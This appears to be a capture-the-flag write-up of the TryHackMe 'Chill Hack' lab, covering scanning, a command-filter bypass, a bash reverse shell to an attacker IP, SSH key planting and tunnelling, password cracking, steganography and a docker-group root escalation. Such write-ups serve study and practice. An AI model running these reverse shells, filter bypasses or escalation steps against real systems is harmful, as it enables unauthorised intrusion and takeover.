---
{"dg-publish":true,"permalink":"/write-ups/try-hack-me/chill-hack/","tags":["CTF","write-up"]}
---


---

![Pasted image 20240928093515.png](/img/user/attachments/Pasted%20image%2020240928093515.png)

> [!info] Description
> **Chill the Hack out of the Machine.**
Easy level CTF.  Capture the flags and have fun!


---
# Active reconnaissance
## Enum ports and services
Executing a general scan
```shell
sudo nmap 10.10.64.167 -sS -p- -n -Pn -vvv --open --min-rate 5000
```
![Pasted image 20240928094052.png|300](/img/user/attachments/Pasted%20image%2020240928094052.png)

---
# Vuln analysis
Executing a focused scan.
```shell
sudo nmap 10.10.64.167 -sCV -p 21,22,80
```

To make it more friendly add the ip to `/etc/hosts/`
```shell
sudo nano /etc/hosts
```
![Pasted image 20240928094722.png|200](/img/user/attachments/Pasted%20image%2020240928094722.png)
## Port 21
![Pasted image 20240928094240.png|500](/img/user/attachments/Pasted%20image%2020240928094240.png)
### FTP anonymous
We have a file on the anonymous, connect and download it
![Pasted image 20240928094922.png|500](/img/user/attachments/Pasted%20image%2020240928094922.png)

Reading the note we have

> [!NOTE] note.txt
> **Anurodh** told me that there is some filtering on strings being put in the command -- **Apaar**

And we have two posibble potencial usernames.

> [!info] Posible usernames
> Anurodh, Apaar
## Port 22
![Pasted image 20240928094303.png|500](/img/user/attachments/Pasted%20image%2020240928094303.png)
## Port 80
![Pasted image 20240928094323.png|500](/img/user/attachments/Pasted%20image%2020240928094323.png)
We have an webpage
![Pasted image 20240928095803.png](/img/user/attachments/Pasted%20image%2020240928095803.png)
### Fuzz
```shell
wfuzz -c -t 50 --hc=404 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://chillhack.thm/FUZZ/
```
![Pasted image 20240928161834.png|500](/img/user/attachments/Pasted%20image%2020240928161834.png)
## Secrets
The most interesting subdirectory is this, we can run some commands on the system like `www-data`
![Pasted image 20240928162657.png|400](/img/user/attachments/Pasted%20image%2020240928162657.png)
## Nikto
+ /images: IP address found in the 'location' header. The IP is "127.0.1.1". See: https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed
+ /images: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is "127.0.1.1". See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649

---
# Exploitation
## Abusing the shell
Trying to abuse the shell on the browser or BurpSuite
We can't run some commands like `ls` or `cat`.  But we can bypass it encoding and decoding on `base64` and running with a `/bin/sh`
E.g. Run `ls` command.
```shell
echo "ls" | base64 | base64 -d | /bin/bash
```
![Pasted image 20240928172635.png|400](/img/user/attachments/Pasted%20image%2020240928172635.png)
## Reverse shell
We will try to get a reverse shell, start the listener
```shell
rlwrap nc -lnvp 4747
```
Run the revershell url encoded
```shell
echo "bash -i >& /dev/tcp/10.6.2.59/4747 0>&1" | base64 | base64 -d | /bin/bash
echo "bash+-i+>%26+/dev/tcp/10.6.2.59/4747+0>%261" | base64 | base64 -d | /bin/bash
```
We have the shell as `wwww-data`
![Pasted image 20240928174803.png|400](/img/user/attachments/Pasted%20image%2020240928174803.png)

---
# Privilege Escalation
## Pkexec
The easy way to escalate to root in this machine is show here [[CVE-2021-4034\|CVE-2021-4034]]
If you want to continue the long way, continue with the write-up.
 ## User
  Listing relevant user
```shell
cat /etc/passwd | grep "sh"
```
![Pasted image 20240928175048.png|500](/img/user/attachments/Pasted%20image%2020240928175048.png)
## Investigating files
In the `/var/www/` folder we see an interest folder named `files`
![Pasted image 20241002080117.png|500](/img/user/attachments/Pasted%20image%2020241002080117.png)
There are a few `php` files and to search text on them recursively. E.g. the text `root`
```shell
grep -A 1 -i -r 'root' /var/www/files/
```
An username and a password was found.
![Pasted image 20241002080358.png](/img/user/attachments/Pasted%20image%2020241002080358.png)
## Data base
Check if or which database is running
E.g.
```shell
ps -faux | grep -iE "sql|db|postgres"
```
![Pasted image 20241002105527.png](/img/user/attachments/Pasted%20image%2020241002105527.png)

Try to log in with the credentials from above.
```shell
mysql -u root -p
```
Works
![Pasted image 20241002105747.png|500](/img/user/attachments/Pasted%20image%2020241002105747.png)
```mysql
show databases;
use webportal;
show tables;
select users;
describe users;
select * from users;
```
We found some credentials.
![Pasted image 20241002151740.png|600](/img/user/attachments/Pasted%20image%2020241002151740.png)
Cracking the hashes using `john`
![Pasted image 20241002162244.png](/img/user/attachments/Pasted%20image%2020241002162244.png)
## Command injection
### Sudo -l
Checking `sudo -l`, I can run a script as `apaar`
![Pasted image 20241001152249.png|500](/img/user/attachments/Pasted%20image%2020241001152249.png)
The script.
![Pasted image 20241001124546.png|500](/img/user/attachments/Pasted%20image%2020241001124546.png)
> [!warning] Warning
> For the script work properly, I have to sanitize the shell [[Notes/Netcat#Technique 1 Python\|Netcat#Technique 1 Python]]
```shell
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
```

When I introduce a text when I asked for a `msg`variable then the script try to execute directly and the vulnerability lies in the `$msg 2>/dev/null` line. As we have the `sudo -l` privilege on the script we can run commands as `apaar`.

I have to execute the script as the owner
```shell
sudo -u USERNAME ./script.sh
```
![Pasted image 20241001163135.png|400](/img/user/attachments/Pasted%20image%2020241001163135.png)
The first answer is irrelevant, and the second is the command we execute a `bash` like `apaar`.
> [!check] User Flag
> ![Pasted image 20241001163842.png|400](/img/user/attachments/Pasted%20image%2020241001163842.png)

## HTTP service
Based on the `nikto` suggestion, check some interesting services, filtering `tcp`and `LISTEN`
```shell
netstat -anlp | grep -E "tcp.*LISTEN"
```
![Pasted image 20241001174957.png|500](/img/user/attachments/Pasted%20image%2020241001174957.png)
The port `3306` is usually associated to `MySQL` or `MariaDB`
`53` Is an `DNS` server
The unusual or probably custom service is 9001 but is only available from localhost and after check it with `curl` we know it's a web server.
![Pasted image 20241001184335.png](/img/user/attachments/Pasted%20image%2020241001184335.png)
Now we are `apaar` and we have `ssh` access and we can perform a ssh tunnel.
## SSH tunnel
**On the Attacker machine**, execute an `cat` the `id_rsa.pub`
```shell
cat /home/kali/.ssh/id_rsa.pub
```
![Pasted image 20241001192909.png](/img/user/attachments/Pasted%20image%2020241001192909.png)
Copy to the clipboard
**On the victim machine**,  using `echo` paste the code and add or replace the `authorized_keys`
```shell
echo "ssh-rsa AAAA............y2w/oJ0= kali@kali" >> authorized_keys
```
![Pasted image 20241001193414.png](/img/user/attachments/Pasted%20image%2020241001193414.png)
Back to the **attacker machine** and now we can connect directly to the `apaar` machine without a password with the `port forwarding`
```shell
ssh apaar@10.10.206.108 -L 9001:127.0.0.1:9001
```
![Pasted image 20241001193609.png](/img/user/attachments/Pasted%20image%2020241001193609.png)
**On the attacker machine** we can see the webpage
## The webportal
![Pasted image 20241001193722.png](/img/user/attachments/Pasted%20image%2020241001193722.png)
Using the credentials from  `mysql`.
![Pasted image 20241002191811.png|600](/img/user/attachments/Pasted%20image%2020241002191811.png)
## Steganography
Download the image `hacker-with-laptop_23-2147985341.jpg` based in the hint, steganography is sus.
Check the file with `steghide`, if maybe it has en empty password:
```shell
steghide info hacker-with-laptop_23-2147985341.jpg
```
![Pasted image 20241002192351.png|400](/img/user/attachments/Pasted%20image%2020241002192351.png)
We have a file, extract:
```shell
steghide extract -sf hacker-with-laptop_23-2147985341.jpg
```
![Pasted image 20241002192531.png|400](/img/user/attachments/Pasted%20image%2020241002192531.png)
Trying to unzip with an empty password.
```shell
unzip backup.zip
```
![Pasted image 20241002192639.png|400](/img/user/attachments/Pasted%20image%2020241002192639.png)
Try to crack the password
1. Get the hash
```shell
zip2john backup.zip > zip_hash.txt
```
![Pasted image 20241002192832.png](/img/user/attachments/Pasted%20image%2020241002192832.png)

2. Crack the hash
```shell
john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt
```
We found the password

Now unzip the file and we have
![Pasted image 20241002193648.png|400](/img/user/attachments/Pasted%20image%2020241002193648.png)
In the code we have an base64 password
![Pasted image 20241002194033.png|400](/img/user/attachments/Pasted%20image%2020241002194033.png)
Decode 
```shell
echo "I..........ZA==" | base64 -d
```
![Pasted image 20241002194239.png|400](/img/user/attachments/Pasted%20image%2020241002194239.png)
## Logged as anurodh
Connect through `ssh`
![Pasted image 20241002194656.png|400](/img/user/attachments/Pasted%20image%2020241002194656.png)
Check infro from us
![Pasted image 20241002195001.png|500](/img/user/attachments/Pasted%20image%2020241002195001.png)
We are in the docker group and can escalate based in `GTFOBins`
```shell
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
![Pasted image 20241002195434.png|500](/img/user/attachments/Pasted%20image%2020241002195434.png)
Get the root flag
> [!check] proof.txt
> ![Pasted image 20241002195645.png](/img/user/attachments/Pasted%20image%2020241002195645.png)

---
